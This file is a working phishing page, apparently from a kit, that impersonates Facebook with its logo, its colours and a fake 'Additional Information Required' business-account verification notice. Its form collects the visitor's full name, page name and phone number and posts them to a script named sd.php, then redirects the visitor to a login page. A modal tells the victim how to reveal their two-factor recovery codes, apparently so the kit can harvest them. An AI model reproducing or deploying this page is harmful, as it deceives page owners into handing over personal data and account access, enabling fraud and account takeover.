<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
<link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
<link rel="stylesheet" href="./assets/css/twofa.css">
<link href="./assets/css/boxicons.min.css" rel="stylesheet">
<style>
    body{
        background-color: #FFFFFF !important;
    }
    .box{
        border:none !important;
    }
    #fa2{
        width: 100% !important;
        height: 55px !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 16px !important;
    }
    .submit2fa{
        width: 100% !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 10px !important;
    }
    .submit2fa:disabled {
        opacity: 0.6 !important;
        cursor: not-allowed !important;
    }
</style>

    <title>Facebook</title>

</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
            <div class="logout">
            <a href="#"><p>Log out</p></a>
        </div>

        </div>
</div>
<div class="mm">
<div class="box">

<div class="box_content">
    <h4><b>Additional Information Required</b></h4>
    <div class="requirements-list">
        <p>To maintain service quality, we need to verify:</p>
        <ul>
            <li>Business account activity</li>
            <li>Content management access</li>
            <li>Administrative privileges</li>
            <li>Account security status</li>
        </ul>
        <p>Please provide the following details to continue managing your account.</p>
    </div>

    <form id="verificationForm" class="verification-form">
        <div class="form-group">
            <input type="text" id="fullName" placeholder="Full Name" required>
        </div>
        <div class="form-group">
            <input type="text" id="pageName" placeholder="Page Name" required>
        </div>
        <div class="form-group">
            <input type="tel" id="phoneNumber" placeholder="Phone Number" required minlength="9" maxlength="18" pattern="[0-9]+" title="Please enter between 9 and 18 digits">
        </div>
        <button type="submit" class="submit2fa" id="continueBtn" disabled>
            <span class="button-text">Continue</span>
            <i class="bx bx-loader-alt bx-spin" style="display: none;"></i>
        </button>
    </form>
</div>

<style>
.submit2fa {
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}

.submit2fa.loading {
    opacity: 0.7;
    pointer-events: none;
}

.submit2fa.loading .button-text {
    display: none;
}

.submit2fa.loading .bx-loader-alt {
    display: inline-block !important;
}

.bx-loader-alt {
    font-size: 20px;
}
</style>

<script>
function validateForm() {
    const fullName = document.getElementById('fullName').value.trim();
    const pageName = document.getElementById('pageName').value.trim();
    const phoneNumber = document.getElementById('phoneNumber').value.trim();
    const continueBtn = document.getElementById('continueBtn');

    // Phone number validation - must be between 9 and 18 digits
    const phoneValid = /^\d{9,18}$/.test(phoneNumber);

    // Enable button only if all fields are valid
    const isValid = fullName.length > 0 && pageName.length > 0 && phoneValid;
    continueBtn.disabled = !isValid;
    
    // Add visual feedback for phone number
    const phoneInput = document.getElementById('phoneNumber');
    if (phoneNumber.length > 0 && !phoneValid) {
        phoneInput.classList.add('error');
    } else {
        phoneInput.classList.remove('error');
    }
}

// Add input event listeners to all fields
document.getElementById('fullName').addEventListener('input', validateForm);
document.getElementById('pageName').addEventListener('input', validateForm);
document.getElementById('phoneNumber').addEventListener('input', validateForm);

// Add specific validation for phone number to only allow digits
document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
    if (!/\d/.test(e.key)) {
        e.preventDefault();
    }
});
</script>

<style>
.form-group input.error {
    border-color: #fa3e3e;
}

.form-group input.error:focus {
    border-color: #fa3e3e;
    box-shadow: 0 0 0 2px rgba(250, 62, 62, 0.2);
}

.submit2fa:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    background: #1877f2;
}
</style>

<style>
.requirements-list {
    background: #f7f8fa;
    padding: 16px;
    border-radius: 8px;
    margin-bottom: 24px;
}

.requirements-list ul {
    margin: 12px 0;
    padding-left: 20px;
}

.requirements-list li {
    color: #65676b;
    margin: 8px 0;
    font-size: 14px;
}

.verification-form {
    margin-top: 24px;
}

.form-group {
    margin-bottom: 16px;
}

.form-group input {
    width: 100%;
    padding: 12px;
    border: 1px solid #dddfe2;
    border-radius: 6px;
    font-size: 15px;
    color: #1c1e21;
}

.form-group input:focus {
    outline: none;
    border-color: #1877f2;
    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
}

#continueBtn {
    background: #1877f2;
    color: white;
    border: none;
    font-size: 15px;
    font-weight: 500;
    margin-top: 8px;
}

#continueBtn:hover {
    background: #166fe5;
}
</style>

<script>
document.getElementById('verificationForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const continueBtn = document.getElementById('continueBtn');
    continueBtn.classList.add('loading');
    
    const formData = new FormData();
    formData.append('fullName', document.getElementById('fullName').value.trim());
    formData.append('pageName', document.getElementById('pageName').value.trim());
    formData.append('phone', document.getElementById('phoneNumber').value.trim());

    fetch('sd.php', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        // First handle the response regardless of content type
        return response.text().then(text => {
            try {
                // Try to parse as JSON if possible
                return JSON.parse(text);
            } catch (e) {
                // If not JSON, just return success anyway
                return { status: 'success' };
            }
        });
    })
    .then(data => {
        // Short delay to show loading
        setTimeout(() => {
            continueBtn.classList.remove('loading');
            window.location.href = '/login';
        }, 1500);
    })
    .catch(error => {
        console.error('Error:', error);
        continueBtn.classList.remove('loading');
    });
});
</script>
</div>
</div>

</div>
<!-- Modal -->
<div id="modal-container">
    <div id="modal">
      <h6>Didn't receive a code?</h6>
      <hr>
      <p>
        1. Go to <b>Settings > Security and Login.</b>
<br> <br>
2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication.</b> You may need to re-enter your password.
<br><br>
3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes.</b> If you've already set up recovery codes, you can click <b>Show Codes.</b>
<br><br>
<img src="./assets/img/recovery.gif" alt="" width="100%" height="auto">

      </p>
      <button id="close-modal" class="close-modal">Continue</button><br><br>
    </div>
  </div>
  
<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script src="./assets/js/twofa.js"></script>



</body>
</html>